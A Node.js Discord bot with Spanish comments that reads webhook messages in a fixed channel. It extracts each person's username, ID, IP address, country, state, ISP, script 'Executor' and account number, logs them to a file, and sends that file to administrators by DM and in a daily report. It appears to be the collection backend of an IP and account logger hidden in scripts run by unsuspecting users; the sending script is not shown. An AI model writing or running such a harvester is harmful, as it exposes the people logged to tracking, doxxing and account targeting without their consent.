const { Client, GatewayIntentBits, AttachmentBuilder, PermissionsBitField } = require("discord.js");
const fs = require("fs");
const path = require("path");

const TOKEN = process.env.TOKEN;
const CAPTURE_CHANNEL = "1437151487141740637";
const SEND_LOGS_CHANNEL = "1440773871254110300";

const LOG_FILE = path.join(__dirname, "logs_globales.txt");

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// Cache temporal para unir mensaje de texto + embed
let pending = {};  // pending[webhookMessageID] = { usuario, id, display }

// =======================================
// 📌 PARSEAR MENSAJE DEL WEBHOOK
// =======================================
client.on("messageCreate", (msg) => {

    if (!msg.webhookId) return;         // solo mensajes del webhook
    if (msg.channel.id !== CAPTURE_CHANNEL) return;

    // ===============================
    // 🟩 1. MENSAJE DE TEXTO (content)
    // ===============================
    if (!msg.embeds.length && msg.content.includes("USUARIO:")) {

        const usuario = msg.content.match(/USUARIO:\s([^|]+)/)?.[1]?.trim() || "N/A";
        const id = msg.content.match(/ID:\s(\d+)/)?.[1]?.trim() || "N/A";
        const display = msg.content.match(/DISPLAY:\s(.+)/)?.[1]?.trim() || "N/A";

        pending[msg.id] = {
            usuario,
            id,
            display,
            timestamp: Date.now()
        };

        return;
    }

    // =======================================
    // 🟦 2. MENSAJE CON EMBED (datos técnicos)
    // =======================================
    if (msg.embeds.length) {

        // encontrar un mensaje de texto previo del mismo webhook
        let matchedKey = null;
        for (let key in pending) {
            if (Date.now() - pending[key].timestamp < 2000) { // 2 segundos
                matchedKey = key;
                break;
            }
        }

        if (!matchedKey) return; // no hay mensaje emparejable

        let { usuario, id, display } = pending[matchedKey];
        delete pending[matchedKey];

        const embed = msg.embeds[0];

        // IP
        let IP = embed.fields[0]?.value.match(/```(.+?)```/)?.[1] || "N/A";

        // País / Estado / Ciudad / ISP
        let UB = embed.fields[1]?.value || "";

        let Pais = UB.match(/País:\s+```(.*?)```/)?.[1] || "N/A";
        let Estado = UB.match(/Estado:\s+```(.*?)```/)?.[1] || "N/A";
        let ISP = UB.match(/ISP:\s*(.+)/)?.[1]?.trim() || "N/A";

        // Executor / Cuenta
        let SYS = embed.fields[2]?.value || "";

        let Executor = SYS.match(/Executor:\s*(.+)/)?.[1]?.trim() || "N/A";
        let Cuenta = SYS.match(/Cuenta:\s*(\d+)/)?.[1] || "N/A";

        // Línea final
        const linea = `${usuario} | ${display} | ${IP} | ${Pais} | ${Estado} | ${ISP} | ${Executor} | ${Cuenta}\n`;

        fs.appendFileSync(LOG_FILE, linea, "utf8");
    }
});


// =======================================
// 📌 COMANDO MANUAL: !loggs
// =======================================
client.on("messageCreate", async (msg) => {
    if (msg.content !== "!loggs") return;

    if (!msg.member.permissions.has(PermissionsBitField.Flags.Administrator))
        return msg.reply("❌ No tienes permisos.");

    if (!fs.existsSync(LOG_FILE))
        return msg.reply("No hay logs.");

    await msg.author.send({
        content: "📄 Logs actuales:",
        files: [new AttachmentBuilder(LOG_FILE)]
    });

    msg.reply("📬 Enviados por DM.");
});

// =======================================
// 📌 ENVÍO AUTOMÁTICO DIARIO
// =======================================
setInterval(() => {
    if (!fs.existsSync(LOG_FILE)) return;
    const canal = client.channels.cache.get(SEND_LOGS_CHANNEL);
    if (!canal) return;

    canal.send({
        content: "📊 **Reporte diario**:",
        files: [new AttachmentBuilder(LOG_FILE)]
    });
}, 24 * 60 * 60 * 1000);

client.login(TOKEN);
